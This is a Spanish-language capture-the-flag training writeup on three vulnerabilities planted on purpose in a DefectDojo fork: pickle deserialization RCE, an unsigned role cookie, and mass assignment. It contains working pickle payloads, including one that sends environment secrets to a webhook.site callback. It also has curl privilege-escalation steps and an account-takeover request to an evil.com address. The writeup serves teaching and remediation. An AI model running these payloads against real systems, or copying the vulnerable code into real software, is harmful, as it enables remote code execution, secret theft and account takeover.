# OWASP A08:2025 — Software or Data Integrity Failures  
## Vulnerabilidades de práctica implementadas en DefectDojo

> **Propósito:** Este documento es material de entrenamiento para un ejercicio de *capture-the-flag* / análisis de código. Las vulnerabilidades descritas aquí fueron introducidas **intencionalmente** en el fork de DefectDojo para que el equipo las identifique, explote y remedie.  
> **No ejecutar en producción ni contra sistemas sin autorización.**

---

## Índice

1. [Vuln 1 — Insecure Deserialization (CWE-502)](#vuln-1--insecure-deserialization-cwe-502)  
2. [Vuln 2 — Cookie sin verificación de integridad (CWE-565 / CWE-784)](#vuln-2--cookie-sin-verificaci%C3%B3n-de-integridad-cwe-565--cwe-784)  
3. [Vuln 3 — Mass Assignment / Escalada de privilegios (CWE-915)](#vuln-3--mass-assignment--escalada-de-privilegios-cwe-915)  

---

## Vuln 1 — Insecure Deserialization (CWE-502)

### Descripción

La deserialización insegura ocurre cuando una aplicación toma datos controlados por el atacante y los pasa a un mecanismo de deserialización sin validar su origen ni su contenido. En Python, `pickle.loads()` puede ejecutar **código arbitrario** durante el proceso de deserialización, ya que el protocolo Pickle permite definir métodos `__reduce__` que se invocan automáticamente al reconstruir un objeto.

### Ubicación en el código

| Elemento | Detalle |
|----------|---------|
| **Archivo** | `dojo/api_v2/views.py` |
| **Clase** | `FindingViewSet` |
| **Método** | `restore_filters` |
| **Endpoint** | `POST /api/v2/findings/restore_filters/` |

### Código vulnerable

```python
@action(detail=False, methods=["post"], permission_classes=[IsAuthenticated])
def restore_filters(self, request):
    import pickle

    encoded_state = request.data.get("state", "")
    raw = base64.b64decode(encoded_state)
    state = pickle.loads(raw)          # ← VULNERABLE: datos del cliente sin verificar
    return Response({"filters": state, "status": "restored"})
```

### Cómo explotar

**Requisito:** tener una cuenta válida en la aplicación (cualquier rol).

El helper `deployment/helpers/A08_V1.py` genera y envía los payloads:

```bash
# Imprimir ambos payloads en base64
python deployment/helpers/A08_V1.py

# Enviar las dos variantes secuencialmente
python deployment/helpers/A08_V1.py --send http://<HOST> <TOKEN>

# Enviar solo una variante
python deployment/helpers/A08_V1.py --send http://<HOST> <TOKEN> -v A
python deployment/helpers/A08_V1.py --send http://<HOST> <TOKEN> -v B
```

---

#### Variante A — Básica (evidencia en el contenedor)

Escribe el output de `id` y `hostname` en `/tmp/pwned` dentro del contenedor `uwsgi`.

```python
class PayloadA:
    def __reduce__(self):
        cmd = "id > /tmp/pwned && hostname >> /tmp/pwned"
        return (__import__("os").system, (cmd,))

payload = base64.b64encode(pickle.dumps(PayloadA())).decode()
```

Enviar y verificar:

```bash
# Enviar
curl -s -X POST http://<HOST>/api/v2/findings/restore_filters/ \
  -H "Authorization: Token <TOKEN>" \
  -H "Content-Type: application/json" \
  -d "{\"state\": \"$PAYLOAD_A\"}"

# Verificar en el contenedor
docker compose exec uwsgi cat /tmp/pwned
# uid=1001(defectdojo) gid=1337(defectdojo) ...
# 1bad5f49d7e5
```

---

#### Variante B — Out-of-Band (OOB) HTTP callback

El payload hace una petición HTTP POST saliente con `id`, `hostname` y todas
las variables de entorno del proceso. No deja artefactos en el servidor víctima.

**Infraestructura:** [webhook.site](https://webhook.site) (gratis, sin registro).
Obtener una URL única, sustituir `CALLBACK_URL` en el script y serializar.

```python
CALLBACK_URL = "https://webhook.site/<TU-UUID>"

class PayloadC:
    def __reduce__(self):
        script = textwrap.dedent(f"""\
            import subprocess, urllib.request, urllib.parse
            out = subprocess.check_output(
                "id && hostname && env", shell=True, stderr=subprocess.STDOUT
            ).decode(errors="replace")
            data = urllib.parse.urlencode({{"output": out}}).encode()
            req = urllib.request.Request("{CALLBACK_URL}", data=data, method="POST")
            try:
                urllib.request.urlopen(req, timeout=5)
            except Exception:
                pass
        """)
        return (__import__("os").system, (f"python3 -c '{script}'",))
```

Los datos aparecen en el panel de webhook.site en tiempo real. En producción
real se obtienen secrets como `DD_SECRET_KEY`, `DD_CREDENTIAL_AES_256_KEY` y
`DD_DATABASE_URL` que permiten comprometer completamente la plataforma:

### Impacto

- Ejecución remota de código (RCE) con los privilegios del proceso de la aplicación.
- Posible escalada a root si el proceso corre como root dentro del contenedor.
- Exfiltración de secrets, claves API, variables de entorno.

### Remediación

- Nunca deserializar datos de fuentes no confiables con `pickle`, `marshal` o `shelve`.
- Usar formatos de datos seguros como **JSON** con validación de esquema.
- Si se requiere serialización de objetos complejos, usar librerías como `marshmallow` con allowlisting explícito de campos.
- Firmar los datos serializados con HMAC antes de transmitirlos y verificar la firma antes de deserializar.

---

## Vuln 2 — Cookie sin verificación de integridad (CWE-565 / CWE-784)

### Descripción

Esta vulnerabilidad ocurre cuando una aplicación toma **decisiones de seguridad** (autorización, nivel de acceso) basándose en el valor de una cookie **sin verificar su autenticidad ni integridad**. Las cookies son datos controlados por el cliente; cualquier usuario puede modificarlas en su navegador o en una petición HTTP.

En este caso, el middleware `UserRoleCookieMiddleware` lee la cookie `dd_role` y, si su valor es `superuser`, eleva los privilegios del usuario en la request en curso sin ninguna validación criptográfica.

### Ubicación en el código

| Elemento | Detalle |
|----------|---------|
| **Archivo** | `dojo/middleware.py` |
| **Clase** | `UserRoleCookieMiddleware` |

### Código vulnerable

```python
class UserRoleCookieMiddleware:
    def __call__(self, request):
        if request.user.is_authenticated:
            dd_role = request.COOKIES.get("dd_role", "")
            if dd_role == "superuser":
                request.user.is_superuser = True   # ← VULNERABLE: sin firma ni verificación
            elif dd_role == "staff":
                request.user.is_staff = True
        return self.get_response(request)
```

### Cómo explotar

**Requisito:** tener una cuenta válida con cualquier rol (incluso el rol más bajo).

El helper `deployment/helpers/A08_V2.py` automatiza todo el flujo (login → exploit → evidencia):

```bash
# Con login automático
python deployment/helpers/A08_V2.py --host http://<HOST> --user <USER> --password <PASS>

# Con sessionid existente
python deployment/helpers/A08_V2.py --host http://<HOST> --session <SESSIONID>
```

**Manual con `curl` (paso a paso):**

**Paso 1 — Obtener el CSRF token y autenticarse:**

```bash
# Guardar csrftoken cookie y extraer csrfmiddlewaretoken del formulario
CSRF=$(curl -s -c cookies.txt http://<HOST>/login \
  | grep -oP 'name="csrfmiddlewaretoken" value="\K[^"]+')

# Login — guarda sessionid en cookies.txt
curl -s -b cookies.txt -c cookies.txt \
  -X POST http://<HOST>/login \
  -H "Referer: http://<HOST>/login" \
  -d "username=<USER>&password=<PASS>&csrfmiddlewaretoken=$CSRF" \
  -o /dev/null
```

**Paso 2 — Verificar acceso SIN y CON la cookie maliciosa:**

```bash
SID=$(grep sessionid cookies.txt | awk '{print $NF}')

# Sin cookie maliciosa → 403
curl -s -b "sessionid=$SID" \
  http://<HOST>/api/v2/users/?format=json -o /dev/null -w "HTTP %{http_code}\n"

# Con dd_role=superuser → 200
curl -s -b "sessionid=$SID; dd_role=superuser" \
  http://<HOST>/api/v2/users/?format=json
```

**Con un navegador** (DevTools → Application → Cookies):

1. Iniciar sesión como usuario normal.
2. Abrir DevTools → pestaña **Application** → **Cookies**.
3. Añadir nueva cookie: nombre `dd_role`, valor `superuser`.
4. Recargar la página o llamar a `GET /api/v2/users/` — el acceso es inmediato.

### Impacto

- Escalada de privilegios horizontal y vertical: cualquier usuario pasa a ser superusuario.
- Acceso a toda la configuración del sistema, credenciales almacenadas, tokens de integración (JIRA, SonarQube).
- Posibilidad de crear, modificar o eliminar cualquier objeto de la aplicación.

### Remediación

- **Nunca confiar en cookies no firmadas para decisiones de autorización.**
- Si se necesita propagar roles desde un proxy/SSO, usar **headers firmados por el proxy** (no cookies del cliente) y validar la IP de origen.
- Usar la sesión del servidor (`request.session`) para almacenar el rol después de una autenticación verificada.
- Implementar cookies firmadas con `django.core.signing` o JWT con algoritmo asimétrico.

---

## Vuln 3 — Mass Assignment / Escalada de privilegios (CWE-915)

### Descripción

El *Mass Assignment* ocurre cuando una aplicación asigna masivamente atributos de un objeto a partir de datos proporcionados por el usuario, sin restringir qué campos son modificables. Esto permite que un atacante modifique campos sensibles que no deberían estar expuestos (como `is_superuser`, `is_staff`, `is_active`).

En este caso, el endpoint `PATCH /api/v2/user_profile/` itera sobre **todos** los campos del cuerpo de la petición y los aplica directamente al modelo de usuario mediante `setattr`, sin ningún allowlist.

### Ubicación en el código

| Elemento | Detalle |
|----------|---------|
| **Archivo** | `dojo/api_v2/views.py` |
| **Clase** | `UserProfileView` |
| **Método** | `patch` |
| **Endpoint** | `PATCH /api/v2/user_profile/` |

### Código vulnerable

```python
def patch(self, request, _=None):
    user = get_current_user()
    allowed_fields = {
        k: v for k, v in request.data.items()   # ← sin filtrado de campos
    }
    for field, value in allowed_fields.items():
        if hasattr(user, field):
            setattr(user, field, value)          # ← asignación directa sin allowlist
    user.save()
    return Response({"status": "profile updated"})
```

### Cómo explotar

**Requisito:** tener una cuenta válida con cualquier rol y un token de API.

El helper `deployment/helpers/A08_V3.py` automatiza todo el flujo (obtener token → explotar → verificar):

```bash
# Con login automático
python deployment/helpers/A08_V3.py --host http://<HOST> --user <USER> --password <PASS>

# Con token existente
python deployment/helpers/A08_V3.py --host http://<HOST> --token <API_TOKEN>

# Revertir los cambios tras la demo
python deployment/helpers/A08_V3.py --host http://<HOST> --token <API_TOKEN> --revert
```

**Manual con `curl` (paso a paso):**

**Paso 1 — Obtener el token de API:**

```bash
curl -s -X POST http://<HOST>/api/v2/api-token-auth/ \
  -H "Content-Type: application/json" \
  -d '{"username": "<USER>", "password": "<PASS>"}'
# Respuesta: {"token": "abc123..."}
```

**Paso 2 — Verificar perfil antes del exploit:**

```bash
curl -s http://<HOST>/api/v2/user_profile/ \
  -H "Authorization: Token <TOKEN>"
# is_superuser debe ser false
```

**Paso 3 — Enviar el payload de escalada:**

```bash
curl -s -X PATCH http://<HOST>/api/v2/user_profile/ \
  -H "Authorization: Token <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"is_superuser": true, "is_staff": true}'
# Respuesta: {"status": "profile updated", "username": "..."}
```

**Paso 4 — Verificar la escalada:**

```bash
# Listar todos los usuarios (solo superusuarios pueden → debe devolver 200)
curl -s http://<HOST>/api/v2/users/?format=json \
  -H "Authorization: Token <TOKEN>" -o /dev/null -w "HTTP %{http_code}\n"
```

**Variante — modificar otro campo crítico:**

```bash
# Cambiar el email para tomar control de la cuenta tras un reset de contraseña
curl -s -X PATCH http://<HOST>/api/v2/user_profile/ \
  -H "Authorization: Token <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"email": "atacante@evil.com", "username": "admin"}'
```

### Impacto

- Cualquier usuario autenticado puede convertirse en superusuario sin interacción de un administrador.
- Modificación de datos de cualquier campo del modelo `Dojo_User` (email, username, contraseña hasheada, etc.).
- Toma de control completa de la plataforma.

### Remediación

- Definir explícitamente un **allowlist** de campos editables por el usuario:
  ```python
  EDITABLE_BY_USER = {"first_name", "last_name", "email"}
  for field, value in request.data.items():
      if field in EDITABLE_BY_USER:
          setattr(user, field, value)
  ```
- Usar serializers de DRF con `read_only_fields` para `is_superuser`, `is_staff`, `is_active`.
- Separar los endpoints de edición de perfil (usuario) de los de gestión de cuentas (admin).

---

## Tabla resumen

| # | Nombre | CWE | Archivo afectado | Vector de ataque | Requisito mínimo |
|---|--------|-----|-----------------|-----------------|-----------------|
| 1 | Insecure Deserialization | CWE-502 | `dojo/api_v2/views.py` | API REST (POST) | Usuario autenticado |
| 2 | Cookie sin integridad | CWE-565 / CWE-784 | `dojo/middleware.py` | Cookie HTTP | Usuario autenticado |
| 3 | Mass Assignment | CWE-915 | `dojo/api_v2/views.py` | API REST (PATCH) | Usuario autenticado |

---

## Referencias

- [OWASP Top 10 A08:2025](https://owasp.org/Top10/2025/A08_2025-Software_or_Data_Integrity_Failures/)
- [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
- [CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes](https://cwe.mitre.org/data/definitions/915.html)
- [CWE-565: Reliance on Cookies without Validation](https://cwe.mitre.org/data/definitions/565.html)
